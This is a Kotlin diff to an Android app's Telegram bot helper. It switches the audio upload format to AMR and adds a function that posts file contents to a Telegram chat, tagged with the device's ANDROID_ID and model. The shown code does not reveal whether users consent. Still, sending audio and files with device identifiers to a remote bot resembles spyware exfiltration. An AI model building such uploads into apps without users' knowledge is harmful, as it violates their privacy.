@@ -97,7 +97,7 @@ class TelegramBotManager(private val context: Context) {
         }
     }
 
-    suspend fun sendAudio(audioBytes: ByteArray, filename: String = "audio.3gp", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
+    suspend fun sendAudio(audioBytes: ByteArray, filename: String = "audio.amr", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
         try {
             val token = getBotToken()
             val chatId = getChatId()
@@ -115,7 +115,7 @@ class TelegramBotManager(private val context: Context) {
                 .addFormDataPart("parse_mode", "Markdown")
                 .addFormDataPart(
                     "document",
-                    filename.ifEmpty { "audio.3gp" },
+                    filename.ifEmpty { "audio.amr" },
                     okhttp3.RequestBody.create("application/octet-stream".toMediaType(), audioBytes)
                 )
                 .build()
@@ -126,6 +126,39 @@ class TelegramBotManager(private val context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Telegram sendAudio error: ${e.message}")
+            false
+        }
+    }
+
+    suspend fun sendDocument(fileBytes: ByteArray, filename: String = "document.txt", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val token = getBotToken()
+            val chatId = getChatId()
+            if (token.isBlank() || chatId.isBlank()) return@withContext false
+
+            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
+            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val fullCaption = "📁 *Document Export*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()
+
+            val url = "https://api.telegram.org/bot$token/sendDocument"
+            val body = okhttp3.MultipartBody.Builder()
+                .setType(okhttp3.MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("caption", fullCaption)
+                .addFormDataPart("parse_mode", "Markdown")
+                .addFormDataPart(
+                    "document",
+                    filename.ifEmpty { "document.txt" },
+                    okhttp3.RequestBody.create("text/plain".toMediaType(), fileBytes)
+                )
+                .build()
+
+            val request = Request.Builder().url(url).post(body).build()
+            client.newCall(request).execute().use { response ->
+                return@withContext response.isSuccessful
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Telegram sendDocument error: ${e.message}")
             false
         }
     }
